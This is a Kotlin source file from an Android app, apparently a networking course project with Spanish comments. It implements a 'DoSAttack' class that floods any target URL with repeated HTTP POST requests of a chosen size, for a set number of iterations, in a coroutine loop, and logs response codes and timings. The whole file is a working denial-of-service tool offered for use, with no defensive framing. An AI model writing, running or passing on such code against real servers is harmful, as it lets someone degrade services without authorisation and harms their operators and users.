package com.proyectoredes.pekka.realizar_ataques


import android.util.Log
import kotlinx.coroutines.*
import java.net.HttpURLConnection
import java.net.URL

class DoSAttack {

    private var job: Job? = null
    private var currentIteration = 0
    private var maxIterations = 100

    fun startDosAttack(targetUrl: String, packetSize: Int, iterations: Int, onComplete: (String) -> Unit) {
        maxIterations = iterations // Actualiza el número máximo de iteraciones
        job = CoroutineScope(Dispatchers.IO).launch {
            currentIteration = 0 // Reinicia el contador de iteraciones

            while (currentIteration < maxIterations && isActive) {
                val result = performDoSAttack(targetUrl, packetSize)

                // Ejecuta onComplete en el hilo principal
                withContext(Dispatchers.Main) {
                    onComplete("Paquete $currentIteration de $maxIterations: $result")
                }

                // Incrementa el contador de iteraciones
                currentIteration++
            }

            // Limpia al finalizar el ataque DoS
            withContext(Dispatchers.Main) {
                onComplete("Ataque DoS completado después de enviar $maxIterations paquetes.")
                Log.i("Ataque DoS", "Ataque DoS completado")
            }
        }
    }

    private suspend fun performDoSAttack(targetUrl: String, packetSize: Int): String {
        return try {
            val url = URL(targetUrl)
            val startTime = System.currentTimeMillis()

            with(url.openConnection() as HttpURLConnection) {
                requestMethod = "POST"  // Utilizando POST para enviar datos
                connectTimeout = 5000  // tiempo de espera para la conexión
                readTimeout = 5000     // tiempo de espera para leer datos

                // Crear un cuerpo de solicitud del tamaño especificado
                doOutput = true
                val outputBytes = ByteArray(packetSize) { 'A'.toByte() }
                outputStream.write(outputBytes)

                // Obtener el código de respuesta y el mensaje de respuesta
                val responseCode = responseCode
                val responseMessage = responseMessage

                val endTime = System.currentTimeMillis()
                val duration = endTime - startTime

                Log.i("Ataque DoS", "Response Code: $responseCode")
                Log.i("Ataque DoS", "Response Message: $responseMessage")
                Log.i("Ataque DoS", "Ping Time: $duration ms")

                "Response Code: $responseCode\nResponse Message: $responseMessage\nPing Time: $duration ms"
            }
        } catch (e: Exception) {
            e.printStackTrace()
            Log.e("Ataque DoS", "Error: ${e.message}")
            "Error: ${e.message}"
        }
    }

    fun stopDosAttack() {
        job?.cancel()
    }
}
